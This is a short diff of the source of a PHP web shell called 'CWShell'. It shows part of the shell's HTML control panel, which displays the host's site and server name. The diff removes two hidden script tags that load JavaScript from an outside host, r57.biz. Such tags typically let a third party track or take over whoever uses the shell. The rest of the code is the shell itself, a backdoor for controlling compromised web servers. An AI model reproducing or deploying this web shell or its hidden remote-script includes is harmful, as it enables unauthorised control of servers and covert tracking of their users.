@@ -364,7 +364,6 @@ border: solid 1px #363636;
 </style>
 
 </head>
-<SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
 <body bgcolor='#000000' text='#ebebeb' link='#ebebeb' alink='#ebebeb' vlink='#ebebeb'>
 <table style='background-color:#333333; border-color:#a6a6a6' width=100% border=0 align=center cellpadding=0 cellspacing=0>
 <tr><td>
@@ -372,7 +371,6 @@ border: solid 1px #363636;
 <font face='Verdana' size='5'><a href='".@$_SERVER['HTTP_REFERER']."'>~ CWShell ~</font></a>
 <font size='6' face='Webdings'>ü</font></b>
 </center>
-<SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
 </td></tr></table><table class=menu width=100%<tr><td>
 <font size='1' face='Verdana'><b>Site:  </b><u>$site</u> <br>
 <b>Server Name: </b><u>" . $_SERVER['SERVER_NAME'] . "</u> <br>
